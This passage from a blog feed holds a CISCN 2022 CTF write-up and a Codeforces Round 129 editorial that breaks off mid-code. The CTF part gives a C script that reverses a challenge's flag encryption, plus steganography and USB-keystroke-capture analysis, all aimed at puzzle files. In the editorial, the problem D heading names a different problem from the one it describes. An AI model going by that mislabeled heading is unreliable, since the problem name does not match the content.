title="baby_tree"></a>baby_tree</h3><p>直接看ast，assign_expr是赋值语句，binary_expr里面decl=后面是运算符，argument_list里的两个argument参与运算，分析一下主要逻辑，写出对应的解密脚本。</p><p>脚本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b[] = &#123;<span class="number">88</span>, <span class="number">35</span>, <span class="number">88</span>, <span class="number">225</span>, <span class="number">7</span>, <span class="number">201</span>, <span class="number">57</span>, <span class="number">94</span>, <span class="number">77</span>, <span class="number">56</span>, <span class="number">75</span>, <span class="number">168</span>, <span class="number">72</span>, <span class="number">218</span>, <span class="number">64</span>, <span class="number">91</span>, <span class="number">16</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">207</span>, <span class="number">73</span>, <span class="number">130</span>, <span class="number">74</span>, <span class="number">128</span>, <span class="number">76</span>, <span class="number">201</span>, <span class="number">16</span>, <span class="number">248</span>, <span class="number">41</span>, <span class="number">205</span>, <span class="number">103</span>, <span class="number">84</span>, <span class="number">91</span>, <span class="number">99</span>, <span class="number">79</span>, <span class="number">202</span>, <span class="number">22</span>, <span class="number">131</span>, <span class="number">63</span>, <span class="number">255</span>, <span class="number">20</span>, <span class="number">16</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> k[] = <span class="string">&quot;345y&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span> - <span class="number">3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = k[<span class="number">0</span>];</span><br><span class="line">        k[<span class="number">0</span>] = k[<span class="number">1</span>];</span><br><span class="line">        k[<span class="number">1</span>] = k[<span class="number">2</span>];</span><br><span class="line">        k[<span class="number">2</span>] = k[<span class="number">3</span>];</span><br><span class="line">        k[<span class="number">3</span>] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">42</span> - <span class="number">4</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> r0 = b[i + <span class="number">0</span>], r1 = b[i + <span class="number">1</span>], r2 = b[i + <span class="number">2</span>], r3 = b[i + <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = k[<span class="number">3</span>];</span><br><span class="line">        k[<span class="number">3</span>] = k[<span class="number">2</span>];</span><br><span class="line">        k[<span class="number">2</span>] = k[<span class="number">1</span>];</span><br><span class="line">        k[<span class="number">1</span>] = k[<span class="number">0</span>];</span><br><span class="line">        k[<span class="number">0</span>] = tmp;</span><br><span class="line">        b[i + <span class="number">0</span>] = r2 ^ k[<span class="number">2</span>];</span><br><span class="line">        b[i + <span class="number">1</span>] = r3 ^ k[<span class="number">3</span>];</span><br><span class="line">        b[i + <span class="number">2</span>] = ((k[<span class="number">0</span>] + (b[i + <span class="number">0</span>] &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0xff</span>) ^ r0;</span><br><span class="line">        b[i + <span class="number">3</span>] = ((k[<span class="number">1</span>] + (b[i + <span class="number">1</span>] &gt;&gt; <span class="number">2</span>)) &amp; <span class="number">0xff</span>) ^ r1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(b[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上面的程序拿到flag</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="everlasting-night"><a href="#everlasting-night" class="headerlink" title="everlasting_night"></a>everlasting_night</h3><p>本来以为不是lsb隐写（因为隐藏字母太小太犄角旮旯了没看见），查看属性无信息获取</p><p>拉入010editor中查看png的文件头和文件尾，发现文件尾后面有一段多出来的字符，不知道是做什么的，先放着</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653813046204.png" alt="1653813046204"></p><p>题目提示含lsb隐写后，拉入Stegsolve查看，终于在Alpha2处发现右下角有猫腻</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653821873989.png" alt="1653821873989"></p><p>但是分析并没有得出信息，坚信信息就隐藏在这里，查阅字典发现row译为中文是行，column是柱，猜测可能是因为右下角的信息是一列的，而我刚开始查看是以行查看，修改成功数据后发现隐藏文本</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653813260877.png" alt="1653813260877"></p><p>拿到这串数字后第一反应使用lsb的工具</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653824152028.png" alt="1653824152028"></p><p>拿到一个文本文件，拉入010查看发现是压缩包文件头，果断修改后缀名为rar</p><p>但是解压需要密码，猜测开头在文件尾后的那一串是密码，但是输入后发现不是，猜测可能是某种加密，广泛尝试后发现是md5隐写</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653817094602.png" alt="1653817094602">解压后得到一个没有后缀的flag文件</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653822607451.png" alt="1653822607451"></p><p>拉入010发现是PNG文件，本来想通过改后缀名拿到答案，后来发现还是太天真</p><p>使用ps和画图打开无果，想到gimp，将文件后缀名改为data后用gimp打开</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653824657534.png" alt="1653824657534"></p><p>发现图片有些怪怪的，本来想拼图找一下flag，但是实在考验眼力，于是尝试修改各种数值，发现猫腻出在宽度上</p><p><img src="/2022/06/01/ciscn2022%E5%88%9D%E8%B5%9Bwriteup/1653824747017.png" alt="1653824747017"></p><p>拿到答案，提交</p><h3 id="ez-usb"><a href="#ez-usb" class="headerlink" title="ez_usb"></a>ez_usb</h3><p>使用 wireshark 打开发现是 usb 键盘流量</p><p>有两个不同的 usb.addr 发送数据，分别将其保存到两个不同的流量包</p><p>用键盘流量分析工具对其提取数据：<a href="https://github.com/WangYihang/UsbKeyboardDataHacker">https://github.com/WangYihang/UsbKeyboardDataHacker</a></p><p>发现有一个 <code>rar</code> 文件，一个 <code>35c535765e50074a</code>，打开rar文件发现需要密码，应该另一串字符就是密码，输入成功拿到 <code>flag</code> 文件</p><h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><p>填个问卷而已</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;咕了有点久了，来发一下&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="CISCN" scheme="http://example.com/categories/CTF/CISCN/"/>
    
    <category term="2022" scheme="http://example.com/categories/CTF/CISCN/2022/"/>
    
    
  </entry>
  
  <entry>
    <title>Educational Coeforces Round 129(Div.2)题解</title>
    <link href="http://example.com/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/"/>
    <id>http://example.com/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/</id>
    <published>2022-05-24T14:00:00.000Z</published>
    <updated>2022-07-09T00:57:06.418Z</updated>
    
    <content type="html"><![CDATA[<p>这波 <code>div2</code> 上大分，写波题解。</p><p>实况录屏<a href="https://www.bilibili.com/video/BV1RS4y1B7g3">在这</a></p><span id="more"></span><h2 id="A-Game-with-Cards"><a href="#A-Game-with-Cards" class="headerlink" title="A. Game with Cards"></a>A. Game with Cards</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目的意思就是说，<code>Alice</code> 和 <code>Bob</code> 分别有 <code>n,m</code> 张牌，然后每次出牌不能小于等于上一次的出牌，如果到自己的回合却不能出牌则判负，问如果两人分别先手，谁会赢？这个稍微想一下就能发现我一开始出最大的一定是最优的策略，比的就是最大值谁最大，假设相等那我肯定出最大的那个我必赢，所以无脑比最大就是这题的思路，如果相等那么谁先手谁赢，所以这里就分三种情况：</p><ol><li><code>max1&gt;max2</code>：<code>Alice</code>必赢</li><li><code>max1&lt;max2</code>：<code>Bob</code>必赢</li><li><code>max1==max2</code>：谁先手谁赢</li></ol><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> max1=<span class="number">0</span>,max2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        max1=<span class="built_in">max</span>(max1,x);</span><br><span class="line">    &#125;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        max2=<span class="built_in">max</span>(max2,x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(max1&gt;max2)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alice\nAlice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(max1&lt;max2)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Bob\nBob&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alice\nBob&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Card-Trick"><a href="#B-Card-Trick" class="headerlink" title="B. Card Trick"></a>B. Card Trick</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>一个以前经常玩的魔术，就是假装洗牌，实则那张牌在哪里记得清清楚楚。给一个序列，每次操作会把前 <code>k</code> 个值移动到最后去。问经过若干次操作之后第一个牌的值是多少，不难发现如果进行一次操作相当于第 <code>k+1</code> 张牌会变成第一张牌，因为是直接移动，不改变顺序，所以不难想到改题目就是统计所有的操作次数最后对 <code>n</code> 取模得到的下标就是第一张牌的位置。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x,op,ans=<span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d\n&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cin&gt;&gt;x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=x;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;op);</span><br><span class="line">        ans+=op;</span><br><span class="line">        ans%=n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a[ans+<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Double-Sort"><a href="#C-Double-Sort" class="headerlink" title="C. Double Sort"></a>C. Double Sort</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>给两个序列，每次一起交换，问最后能否交换成都不递减，且若能则输出交换次数最少的方案。我们直接定义结构体存储两个序列的值再重载小于号，让它严格按 <code>a</code> 递增，相等的情况按 <code>b</code>递增，因为交换次数最少，不难想到用选择排序可以达到交换次数最少的目的。那么我们就先排个序，然后判断 <code>b</code> 的值是否不递减就可以了。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//int a[maxn];</span></span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">in</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//    scanf(&quot;%d%d&quot;,&amp;a,&amp;b);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt;(<span class="keyword">const</span> A &amp;q)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a==q.a)&#123;</span><br><span class="line">            <span class="keyword">return</span> b&lt;q.b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a&lt;q.a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;a[maxn]; </span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;ans;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;().<span class="built_in">swap</span>(ans);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i].a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i].b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> idx=i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j]&lt;a[idx])&#123;</span><br><span class="line">                idx=j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(idx!=i)&#123;</span><br><span class="line">            ans.<span class="built_in">push</span>(&#123;idx,i&#125;);</span><br><span class="line">            <span class="built_in">swap</span>(a[i],a[idx]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i<span class="number">-1</span>].b&gt;a[i].b)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">while</span>(ans.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">auto</span> x=ans.<span class="built_in">front</span>();</span><br><span class="line">        ans.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,x.first,x.second);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Colorful-Stamp"><a href="#D-Colorful-Stamp" class="headerlink" title="D. Colorful Stamp"></a>D. Colorful Stamp</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>这个题，就是说对一个数进行操作，每次可以把这个数的十进制某一位作为乘数乘这个数，即为一次操作。问你最小操作次数使这个数变成十进制 <code>n</code> 位。</p><p>这个题的话就直接无脑广搜就好了。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int unsigned long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> target=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">40</span>;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bfs</span><span class="params">(<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    q.<span class="built_in">push</span>(&#123;now,<span class="number">0</span>&#125;);</span><br><span class="line">    <span class="keyword">bool</span> used[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        cnt++;</span><br><span class="line">        <span class="built_in">memset</span>(used,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(used));</span><br><span class="line">        <span class="keyword">int</span> num=q.<span class="built_in">front</span>().first;</span><br><span class="line">        <span class="keyword">int</span> step=q.<span class="built_in">front</span>().second;</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">int</span> m=num;</span><br><span class="line">        <span class="keyword">if</span>(num&gt;=target)&#123;</span><br><span class="line">            <span class="comment">//printf(&quot;%lld\n&quot;,cnt);</span></span><br><span class="line">            <span class="keyword">return</span> step;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(m)&#123;</span><br><span class="line">            <span class="keyword">int</span> p=m%<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span>(p!=<span class="number">0</span>&amp;&amp;p!=<span class="number">1</span>&amp;&amp;!used[p])&#123;</span><br><span class="line">                used[p]=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(ma[p*num]==<span class="number">1</span>)<span class="keyword">continue</span>;</span><br><span class="line">                ma[p*num]=<span class="number">1</span>;</span><br><span class="line">                q.<span class="built_in">push</span>(&#123;p*num,step+<span class="number">1</span>&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            m/=<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> n,x;</span><br><span class="line">    